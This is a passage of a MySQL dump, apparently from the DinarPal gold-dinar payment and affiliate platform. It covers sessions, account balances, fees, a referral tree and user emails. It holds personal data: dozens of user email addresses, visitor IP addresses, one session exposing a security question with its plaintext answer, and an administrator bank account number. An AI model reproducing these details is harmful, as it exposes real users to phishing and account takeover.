('fe6c4182812e44430436804891193004', '183.171.24.91', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461676253, 'a:50:{s:5:"me_id";s:2:"47";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"Azhar9751";s:11:"me_lastname";s:9:"Azhar9751";s:11:"me_username";s:9:"Azhar9751";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"Azhar9751";s:14:"me_unique_link";s:32:"033ed15796968126a1ef11da142912a6";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"azhar29066@gmail.com";s:16:"me_register_date";s:19:"2016-04-26 21:01:27";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T21:10:37+08:00";s:12:"me_magic_num";s:32:"9a5749634c226c2629c9d3e3d217bb2f";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('fe9fc1951aea1dc64e625693da86b3b9', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461708592, ''),
('fec032a0b43c9ec1d125d998691440f9', '207.46.13.26', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461258972, ''),
('feede5c4111220dabbe412ab0d9ecb81', '173.252.90.243', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461319601, ''),
('ff39e41c70e392af28a27bf71ccb8e12', '68.180.230.178', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461204131, ''),
('ff3d912b9ca07a44d60ece56abdbd86c', '203.106.158.48', 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo S820 Bui', 1461456272, 'a:1:{s:12:"me_id_parent";s:88:"0NMuxzAWRLJgFniCM_MLidl_Pgyq9xuPzBCddmUEWkNsbbUkiKKilqHZ9QpW0pNgK4PTlN9N7IWrnnVZoyw0PQ==";}'),
('ff4f0c727c3711dd22b723ec27decddf', '5.102.173.71', 'Mozilla/5.0 (compatible; MojeekBot/0.6; +https://w', 1461780680, ''),
('ff6342dd15011dedfbe3af06387a30d2', '133.242.52.175', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Geck', 1461680811, ''),
('ff7c9ecb80eb78dd738d3c9b20902bc5', '66.249.64.96', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461802245, ''),
('ff9842a8070a375c21f4541df0f57949', '173.252.115.9', 'facebookexternalhit/1.1', 1461681956, 'a:1:{s:12:"me_id_parent";s:4:"AjU=";}'),
('ff9dfddc7a9732e1fff1ba73a8aba86c', '1.9.103.225', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461412687, 'a:1:{s:12:"me_id_parent";s:88:"ark4Z-oFKY5rU-8psJQeIe_sCv5hkpqWxl-ZIW9M4j1tGrqP72C82yNvCPKEF7vJ9HpTymO7TZqp0pJrpKrHZA==";}'),
('ffc54c0487633fddf58a6db03c1043f1', '5.255.253.81', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461485857, '');

-- --------------------------------------------------------

--
-- Table structure for table `countries`
--

CREATE TABLE IF NOT EXISTS `countries` (
  `co_id` int(11) NOT NULL AUTO_INCREMENT,
  `co_name` varchar(200) NOT NULL,
  PRIMARY KEY (`co_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `countries`
--

INSERT INTO `countries` (`co_id`, `co_name`) VALUES
(1, 'Algeria'),
(2, 'Australia'),
(3, 'Malaysia'),
(4, 'United State of America'),
(5, 'China');

-- --------------------------------------------------------

--
-- Table structure for table `deposit`
--

CREATE TABLE IF NOT EXISTS `deposit` (
  `de_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `de_datetime` datetime NOT NULL,
  `ft_id` int(11) NOT NULL,
  `at_id` int(11) NOT NULL,
  `de_amount` varchar(200) NOT NULL,
  `de_notes` varchar(500) NOT NULL,
  `de_code` varchar(200) NOT NULL,
  `det_id` int(11) NOT NULL,
  `ts_id` int(11) NOT NULL,
  PRIMARY KEY (`de_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `deposit_type`
--

CREATE TABLE IF NOT EXISTS `deposit_type` (
  `det_id` int(11) NOT NULL AUTO_INCREMENT,
  `det_desc` varchar(200) NOT NULL,
  `det_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`det_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `deposit_type`
--

INSERT INTO `deposit_type` (`det_id`, `det_desc`, `det_status`) VALUES
(1, 'Bank Transfer', 1),
(2, 'Visa Transfer', 2),
(3, 'Cash Deposit Machine', 2);

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_account`
--

CREATE TABLE IF NOT EXISTS `dinarpal_account` (
  `da_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `da_gold_rahnu_gram` varchar(200) DEFAULT '0',
  `da_gold_rahnu_money` varchar(200) DEFAULT '0',
  `da_gold_balance` varchar(200) DEFAULT '0',
  `da_gold_reserved` varchar(200) DEFAULT '0',
  `da_silver_rahnu_gram` varchar(200) DEFAULT '0',
  `da_silver_rahnu_money` varchar(200) DEFAULT '0',
  `da_silver_balance` varchar(200) DEFAULT '0',
  `da_silver_reserved` varchar(200) DEFAULT '0',
  `da_point_balance` varchar(200) DEFAULT '0',
  PRIMARY KEY (`da_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=42 ;

--
-- Dumping data for table `dinarpal_account`
--

INSERT INTO `dinarpal_account` (`da_id`, `me_id`, `da_gold_rahnu_gram`, `da_gold_rahnu_money`, `da_gold_balance`, `da_gold_reserved`, `da_silver_rahnu_gram`, `da_silver_rahnu_money`, `da_silver_balance`, `da_silver_reserved`, `da_point_balance`) VALUES
(1, 1, '0', '0', '194.0434664', '0', '0', '0', '0', '0', '0'),
(2, 2, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(3, 3, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(4, 6, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(5, 7, '0', '0', '128.7327528', '0', '0', '0', '0', '0', '0'),
(6, 8, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(7, 9, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(8, 10, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(9, 11, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(10, 24, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(11, 25, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(12, 26, '0', '0', '200', '0', '0', '0', '0', '0', '0'),
(13, 27, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(14, 28, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(15, 29, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(16, 30, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(17, 31, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(18, 32, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(19, 33, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(20, 34, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(21, 35, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(22, 36, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(23, 37, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(24, 38, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(25, 39, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(26, 40, '0', '0', '250', '0', '0', '0', '0', '0', '0'),
(27, 41, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(28, 42, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(29, 43, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(30, 44, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(31, 45, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(32, 46, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(33, 47, '0', '0', '77.35', '0', '0', '0', '0', '0', '0'),
(34, 48, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(35, 49, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(36, 50, '0', '0', '18.8287808', '1', '0', '0', '0', '0', '0'),
(37, 51, '0', '0', '9.735', '0', '0', '0', '0', '0', '0'),
(38, 52, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(39, 53, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(40, 54, '0', '0', '0', '0', '0', '0', '0', '0', '0'),
(41, 55, '0', '0', '0', '0', '0', '0', '0', '0', '0');

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_admin_account`
--

CREATE TABLE IF NOT EXISTS `dinarpal_admin_account` (
  `daa_id` int(11) NOT NULL AUTO_INCREMENT,
  `daa_account_dinar` varchar(200) NOT NULL DEFAULT '0',
  `daa_account_dinar_gram` varchar(200) NOT NULL DEFAULT '0',
  `daa_account_dirham` varchar(200) NOT NULL DEFAULT '0',
  `daa_account_dirham_gram` varchar(200) NOT NULL DEFAULT '0',
  PRIMARY KEY (`daa_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `dinarpal_admin_account`
--

INSERT INTO `dinarpal_admin_account` (`daa_id`, `daa_account_dinar`, `daa_account_dinar_gram`, `daa_account_dirham`, `daa_account_dirham_gram`) VALUES
(1, '200004', '20000', '2000000', '20000');

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_config`
--

CREATE TABLE IF NOT EXISTS `dinarpal_config` (
  `dc_id` int(11) NOT NULL AUTO_INCREMENT,
  `dc_currency_type` varchar(200) DEFAULT NULL,
  `dc_admin_bank_account` varchar(50) NOT NULL,
  `dc_admin_bank_name` varchar(200) NOT NULL,
  `dc_gst_rate` varchar(200) NOT NULL,
  `dc_hq_username` varchar(200) NOT NULL,
  `dc_geneology_rate` varchar(200) NOT NULL,
  `dc_comm_gram_rate` varchar(200) NOT NULL DEFAULT '0',
  PRIMARY KEY (`dc_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `dinarpal_config`
--

INSERT INTO `dinarpal_config` (`dc_id`, `dc_currency_type`, `dc_admin_bank_account`, `dc_admin_bank_name`, `dc_gst_rate`, `dc_hq_username`, `dc_geneology_rate`, `dc_comm_gram_rate`) VALUES
(1, 'MYR', '04042010006119', 'Koperasi DinarPal Melaka Berhad', '0.06', 'dphq', '0.10', '1.00');

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_document`
--

CREATE TABLE IF NOT EXISTS `dinarpal_document` (
  `dd_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `dd_filename` varchar(200) DEFAULT NULL,
  `dd_size` int(11) DEFAULT '0',
  `dd_type` varchar(200) DEFAULT NULL,
  `ddt_id` int(11) NOT NULL,
  `mvs_id` int(11) DEFAULT '1',
  `mv_id` int(11) DEFAULT '0',
  PRIMARY KEY (`dd_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=7 ;

--
-- Dumping data for table `dinarpal_document`
--

INSERT INTO `dinarpal_document` (`dd_id`, `me_id`, `dd_filename`, `dd_size`, `dd_type`, `ddt_id`, `mvs_id`, `mv_id`) VALUES
(1, 31, '1d91d39c4ed742b71747e41122a93658.jpg', 504, 'image/jpeg', 1, 1, NULL),
(2, 27, 'a109efb051946a5674b806ccf19cf71f.jpg', 400, 'image/jpeg', 1, 1, NULL),
(3, 26, 'd52d28785204a05a97b03553901d3239.jpg', 74, 'image/jpeg', 1, 1, NULL),
(4, 26, '0d4d56450ff51d93e5469752373ec0a1.JPG', 150, 'image/jpeg', 2, 1, NULL),
(5, 6, '973f381752239ab92b476381859b31a5.jpg', 1594, 'image/jpeg', 1, 1, NULL),
(6, 6, 'a75e1b2cfcc4bee9a87ebfa7c734bfc6.jpg', 721, 'image/jpeg', 2, 1, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_document_type`
--

CREATE TABLE IF NOT EXISTS `dinarpal_document_type` (
  `ddt_id` int(11) NOT NULL AUTO_INCREMENT,
  `ddt_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`ddt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `dinarpal_document_type`
--

INSERT INTO `dinarpal_document_type` (`ddt_id`, `ddt_desc`) VALUES
(1, 'First Document'),
(2, 'Second or Supporting Document');

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_services`
--

CREATE TABLE IF NOT EXISTS `dinarpal_services` (
  `ds_id` int(11) NOT NULL AUTO_INCREMENT,
  `ds_desc` varchar(200) NOT NULL,
  `ds_rate` varchar(200) NOT NULL DEFAULT '0',
  `dst_id` int(11) NOT NULL,
  `ds_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`ds_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=7 ;

--
-- Dumping data for table `dinarpal_services`
--

INSERT INTO `dinarpal_services` (`ds_id`, `ds_desc`, `ds_rate`, `dst_id`, `ds_status`) VALUES
(1, 'FedEx', '100', 1, 1),
(2, 'Pos Laju', '10', 1, 1),
(3, 'Pos Express', '10', 1, 1),
(4, 'Takaful', '200', 2, 1),
(5, 'MAA', '100', 2, 1),
(6, 'Prudential', '50', 2, 1);

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_services_type`
--

CREATE TABLE IF NOT EXISTS `dinarpal_services_type` (
  `dst_id` int(11) NOT NULL AUTO_INCREMENT,
  `dst_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`dst_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `dinarpal_services_type`
--

INSERT INTO `dinarpal_services_type` (`dst_id`, `dst_desc`) VALUES
(1, 'Courier Services'),
(2, 'Insurance Services');

-- --------------------------------------------------------

--
-- Table structure for table `dinarpal_transaction`
--

CREATE TABLE IF NOT EXISTS `dinarpal_transaction` (
  `dt_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `tr_amount` varchar(200) DEFAULT '0',
  `pt_id` int(11) NOT NULL,
  `at_id` int(11) NOT NULL,
  `tr_notes` varchar(500) DEFAULT NULL,
  `tr_datetime` datetime NOT NULL,
  `ft_id` int(11) NOT NULL,
  `ts_id` int(11) DEFAULT '1',
  PRIMARY KEY (`dt_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `emails`
--

CREATE TABLE IF NOT EXISTS `emails` (
  `em_id` int(11) NOT NULL AUTO_INCREMENT,
  `em_emails` varchar(200) NOT NULL,
  `me_id` int(11) NOT NULL,
  `em_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`em_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=44 ;

--
-- Dumping data for table `emails`
--

INSERT INTO `emails` (`em_id`, `em_emails`, `me_id`, `em_status`) VALUES
(1, 'kidzeclipes@gmail.com', 1, 2),
(2, 'umar@tuffah.info', 2, 2),
(3, 'nurumira@gmail.com', 3, 2),
(4, 'pisang@dinarpal.com', 4, 2),
(5, 'staff@dinarpal.com', 5, 2),
(6, 'umaqgeek@gmail.com', 6, 2),
(7, 'arash.private@live.com', 7, 2),
(8, 'mohdz7296@yahoo.com', 8, 2),
(9, 'ruxaini89@gmail.com', 9, 2),
(10, 'muhai1991@gmail.com', 10, 2),
(11, 'affan_nasir@ymail.com', 11, 2),
(12, 'fadhlanj24@gmail.com', 24, 2),
(13, 'mohdazizi@myself.com', 25, 2),
(14, 'ijul89@gmail.com', 26, 2),
(15, 'bngbaby@gmail.com', 27, 2),
(16, 'shahsgn80@gmail.com', 28, 2),
(17, 'Md_azemifly@yahoo.com.my', 29, 2),
(18, 'Shah_SGN80@yahoo.com', 30, 2),
(19, 'azren_78@yahoo.com', 31, 2),
(20, 'Refinity_alorgajah@yahoo.com', 32, 2),
(21, 'yusnita7303@gmail.com', 33, 2),
(22, 'ibrahimabdhalim8@gmail.com', 34, 2),
(23, 'nurazrreen@hotmail.com', 35, 2),
(24, 'alonthegreat@gmail.com', 36, 2),
(25, 'hangatt@gmail.com', 37, 2),
(26, 'adleefx@gmail.com', 38, 2),
(27, 'shafira_fatihah09@yahoo.com', 39, 2),
(28, 'doodey5329@gmail.com', 40, 2),
(29, 'mreduans@usm.my', 41, 2),
(30, 'icexnine@gmail.com', 42, 2),
(31, 'bakhtiar15@yahoo.com', 43, 2),
(32, 'borhanudin.hamdan@gmail.com', 44, 2),
(33, 'fxbitlab@gmail.com', 45, 2),
(34, 'rizal.rahim82@gmail.com', 46, 2),
(35, 'azhar29066@gmail.com', 47, 2),
(36, 'rajaputerishafiqkin@gmail.com', 48, 2),
(37, 'omar.mpputem1415@gmail.com', 49, 2),
(38, 'aizuddin.zulkafli@gmail.com', 50, 2),
(39, 'missaa112@yahoo.com', 51, 2),
(40, 'alia.azhar@outlook.com', 52, 2),
(41, 'shafira_fatihah09@yahoo.com', 53, 2),
(42, 'shafira_fatihah09@yahoo.com', 54, 2),
(43, 'zulaikhaabdullah75@gmail.com', 55, 2);

-- --------------------------------------------------------

--
-- Table structure for table `fee_type`
--

CREATE TABLE IF NOT EXISTS `fee_type` (
  `ft_id` int(11) NOT NULL AUTO_INCREMENT,
  `ft_name` varchar(200) DEFAULT NULL,
  `ft_price` varchar(200) DEFAULT '0.00',
  `ft_addon` varchar(200) DEFAULT '',
  `ft_type` varchar(200) NOT NULL,
  PRIMARY KEY (`ft_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=16 ;

--
-- Dumping data for table `fee_type`
--

INSERT INTO `fee_type` (`ft_id`, `ft_name`, `ft_price`, `ft_addon`, `ft_type`) VALUES
(1, 'Account Verification Fee', '10.00', '', 'STATIC'),
(2, 'Ar-Rahnu Fee', '10.00', '', 'STATIC'),
(3, 'Safe Keeping Fee', '0.55', '', 'DYNAMIC'),
(4, 'Transaction Fee', '2.00', '', 'STATIC'),
(5, 'Withdrawal Fee (Money)', '0.01', '', 'DYNAMIC'),
(6, 'Deposit Fee', '0.01', NULL, 'DYNAMIC'),
(7, 'Vault Fee', '0.01', '', 'DYNAMIC'),
(8, 'Liquid Gold Fee', '0.75', '', 'DYNAMIC'),
(9, 'Send Payment Money Fee', '0.00', '', 'STATIC'),
(10, 'Receive Payment Money Fee', '0.025', '0', 'DYNAMIC'),
(11, 'Send Payment Gram Fee', '0.00', '', 'STATIC'),
(12, 'Receive Payment Money Fee', '0.025', '0', 'DYNAMIC'),
(13, 'GST Tax Fee', '0.06', '', 'DYNAMIC'),
(14, 'Withdrawal Fee (Gram)', '0.01', '', 'DYNAMIC'),
(15, 'Bank Transaction Fee', '2.00', '', 'STATIC');

-- --------------------------------------------------------

--
-- Table structure for table `gender`
--

CREATE TABLE IF NOT EXISTS `gender` (
  `g_id` int(11) NOT NULL AUTO_INCREMENT,
  `g_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`g_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `gender`
--

INSERT INTO `gender` (`g_id`, `g_desc`) VALUES
(1, 'Male'),
(2, 'Female');

-- --------------------------------------------------------

--
-- Table structure for table `geneology_aff`
--

CREATE TABLE IF NOT EXISTS `geneology_aff` (
  `ga_id` int(11) NOT NULL AUTO_INCREMENT,
  `ga_datetime` datetime NOT NULL,
  `me_id` int(11) NOT NULL,
  `me_id_parent` int(11) NOT NULL,
  `ga_status` int(11) NOT NULL DEFAULT '1',
  `ga_unique_link` varchar(200) NOT NULL,
  PRIMARY KEY (`ga_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=46 ;

--
-- Dumping data for table `geneology_aff`
--

INSERT INTO `geneology_aff` (`ga_id`, `ga_datetime`, `me_id`, `me_id_parent`, `ga_status`, `ga_unique_link`) VALUES
(1, '2014-11-10 10:12:00', 1, 0, 1, '5713344965592526'),
(2, '2014-12-13 19:45:41', 2, 1, 1, '3452197058634491'),
(4, '2014-12-28 07:27:16', 4, 1, 1, '2917536403071913'),
(5, '2014-12-28 07:28:05', 5, 2, 1, '0864178593668232'),
(7, '2015-04-27 03:12:49', 3, 2, 1, '6413038609762746'),
(8, '2016-04-23 17:41:39', 6, 1, 1, '4387078351537432'),
(9, '2016-04-23 17:41:44', 7, 1, 1, '7698145366534914'),
(10, '2016-04-23 17:56:16', 8, 7, 1, '8586310128657194'),
(11, '2016-04-23 19:11:04', 9, 7, 1, '8001093664221522'),
(12, '2016-04-23 19:16:31', 10, 1, 1, '2961504512728229'),
(13, '2016-04-23 20:34:09', 11, 7, 1, '6475686933183419'),
(14, '2016-04-23 22:15:35', 24, 1, 1, '3750216052027735'),
(15, '2016-04-23 22:15:39', 25, 1, 1, '3814330499641723'),
(16, '2016-04-23 22:15:46', 26, 1, 1, '4333132295956439'),
(17, '2016-04-23 22:16:00', 27, 1, 1, '1711239335353059'),
(18, '2016-04-23 22:16:04', 28, 1, 1, '4638356148613958'),
(19, '2016-04-23 22:17:52', 29, 1, 1, '2618401649309515'),
(20, '2016-04-23 22:18:12', 30, 1, 1, '3618910170221223'),
(21, '2016-04-23 22:18:24', 31, 1, 1, '4058348567991310'),
(22, '2016-04-23 22:19:44', 32, 1, 1, '7082266698580169'),
(23, '2016-04-23 22:39:20', 33, 1, 1, '8717784820063464'),
(24, '2016-04-24 00:21:33', 34, 7, 1, '7459354912836546'),
(25, '2016-04-24 10:08:07', 35, 6, 1, '1592480930417017'),
(26, '2016-04-24 14:55:26', 36, 7, 1, '0726781435238713'),
(27, '2016-04-24 16:32:40', 37, 1, 1, '9778909457900019'),
(28, '2016-04-24 16:35:28', 38, 7, 1, '3567652272442051'),
(29, '2016-04-24 16:58:48', 39, 1, 1, '2049248090606163'),
(30, '2016-04-24 17:17:52', 40, 7, 1, '6023490033247503'),
(31, '2016-04-24 19:28:21', 41, 40, 1, '8905905874109263'),
(32, '2016-04-25 10:11:41', 42, 6, 1, '5567848432406516'),
(33, '2016-04-25 12:25:00', 43, 1, 1, '5488053336314242'),
(34, '2016-04-25 13:31:08', 44, 1, 1, '7824589893336645'),
(35, '2016-04-25 22:47:21', 45, 1, 1, '5707471711087644'),
(36, '2016-04-26 15:06:02', 46, 1, 1, '9788691417914644'),
(37, '2016-04-26 21:01:27', 47, 1, 1, '3810870545887232'),
(38, '2016-04-26 21:07:27', 48, 26, 1, '3742436693165005'),
(39, '2016-04-27 03:51:50', 49, 1, 1, '5683059129012603'),
(40, '2016-04-27 14:43:36', 50, 7, 1, '5778866356251728'),
(41, '2016-04-27 22:22:11', 51, 47, 1, '4625463344844138'),
(42, '2016-04-28 13:20:59', 52, 47, 1, '2892354733659694'),
(43, '2016-04-29 11:29:41', 53, 1, 1, '8801942880293556'),
(44, '2016-04-29 11:41:23', 54, 1, 1, '3099168108209469'),
(45, '2016-04-29 11:53:29', 55, 1, 1, '8441076567875577');

-- --------------------------------------------------------

--
-- Table structure for table `geneology_aff_child`
--

CREATE TABLE IF NOT EXISTS `geneology_aff_child` (
  `gac_id` int(11) NOT NULL AUTO_INCREMENT,
  `ga_id` int(11) NOT NULL,
  `gac_datetime` datetime NOT NULL,
  `gac_paymentdate` datetime DEFAULT NULL,
  `gac_amount` varchar(200) NOT NULL,
  `gac_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`gac_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `geneology_aff_child`
--

INSERT INTO `geneology_aff_child` (`gac_id`, `ga_id`, `gac_datetime`, `gac_paymentdate`, `gac_amount`, `gac_status`) VALUES
(1, 16, '2016-04-24 00:31:33', NULL, '0.2', 1),
(2, 30, '2016-04-24 18:32:29', NULL, '0.2', 1),
(3, 9, '2016-04-24 18:38:29', NULL, '0.2', 1),
(4, 40, '2016-04-27 15:00:36', NULL, '0.222332', 1),
(5, 40, '2016-04-27 15:06:24', NULL, '0.2', 1),
(6, 40, '2016-04-27 15:14:42', NULL, '0.0025', 1),
(7, 9, '2016-04-27 20:53:35', NULL, '0.020212', 1),
(8, 37, '2016-04-28 08:26:58', NULL, '0.25', 1),
(9, 9, '2016-04-28 08:35:04', NULL, '0.025', 1),
(10, 41, '2016-04-28 08:39:35', NULL, '0.025', 1);

-- --------------------------------------------------------

--
-- Table structure for table `geneology_material`
--

CREATE TABLE IF NOT EXISTS `geneology_material` (
  `gm_id` int(11) NOT NULL AUTO_INCREMENT,
  `gm_name` varchar(200) NOT NULL,
  `gmt_id` int(11) NOT NULL,
  `gm_desc` text NOT NULL,
  `gm_link` varchar(500) NOT NULL,
  `gm_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`gm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `geneology_material`
--

INSERT INTO `geneology_material` (`gm_id`, `gm_name`, `gmt_id`, `gm_desc`, `gm_link`, `gm_status`) VALUES
(3, 'User Manual', 1, '', 'b10bc-eticketing.pdf', 0);

-- --------------------------------------------------------

--
-- Table structure for table `geneology_material_type`
--

CREATE TABLE IF NOT EXISTS `geneology_material_type` (
  `gmt_id` int(11) NOT NULL AUTO_INCREMENT,
  `gmt_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`gmt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `geneology_material_type`
--

INSERT INTO `geneology_material_type` (`gmt_id`, `gmt_desc`) VALUES
(1, 'PDF File'),
(2, 'Word File'),
(3, 'Image File');

-- --------------------------------------------------------

--
-- Table structure for table `geneology_status`
--

CREATE TABLE IF NOT EXISTS `geneology_status` (
  `gs_id` int(11) NOT NULL AUTO_INCREMENT,
  `gs_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`gs_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `geneology_status`
--

INSERT INTO `geneology_status` (`gs_id`, `gs_desc`) VALUES
(1, 'Pending'),
(2, 'Completed'),
(3, 'Declined'),
(4, 'Requested');

-- --------------------------------------------------------

--
-- Table structure for table `itc_type`
--

CREATE TABLE IF NOT EXISTS `itc_type` (
  `itct_id` int(11) NOT NULL AUTO_INCREMENT,
  `itct_image` varchar(2000) DEFAULT NULL,
  `itct_image2` varchar(2000) DEFAULT NULL,
  `itct_image3` varchar(2000) DEFAULT NULL,
  `itct_name` varchar(200) NOT NULL,
  `itct_price_rate` varchar(200) NOT NULL,
  `itct_weight` varchar(200) NOT NULL,
  `itct_cert` varchar(2000) DEFAULT NULL,
  `bi_id` int(11) NOT NULL,
  `pu_id` int(11) NOT NULL,
  PRIMARY KEY (`itct_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=14 ;

--
-- Dumping data for table `itc_type`
--

INSERT INTO `itc_type` (`itct_id`, `itct_image`, `itct_image2`, `itct_image3`, `itct_name`, `itct_price_rate`, `itct_weight`, `itct_cert`, `bi_id`, `pu_id`) VALUES
(1, '3940c-1dinar.jpg', NULL, NULL, '1 Dinar', '558.58', '4.25', 'DP001', 1, 1),
(2, '190c6-5dinar.jpg', 'c8b57-5dinar.jpg', '6d86e-5dinar.jpg', '5 Dinar', '2783.75', '21.25', 'DP002', 1, 1),
(3, 'a73dd-10dinar_2.jpg', NULL, NULL, '10 Dinar', '5585.80', '42.50', 'DP003', 1, 1),
(4, '4ed7f-dinar-kelantan-kgt-2012.jpg', '52c2e-dinar-kelantan-kgt-2012.jpg', '0e44e-dinar-kelantan-kgt-2012.jpg', 'Dinar KGT 1 Dinar', '600', '4.25', 'KGT01', 1, 1),
(8, 'a152f-asyq8ouhqx-2vse0juumehphom8rjgd6eotoszcqtoey.jpg', NULL, NULL, 'YaPEIM', '800', '1', 'YPE12', 1, 1),
(13, 'b61d5-download.jpg', '18f6a-icon.png', 'be0e6-botol+1+liter.jpg', 'juah', '78', '8', 'hu', 1, 1);

-- --------------------------------------------------------

--
-- Table structure for table `item_courier`
--

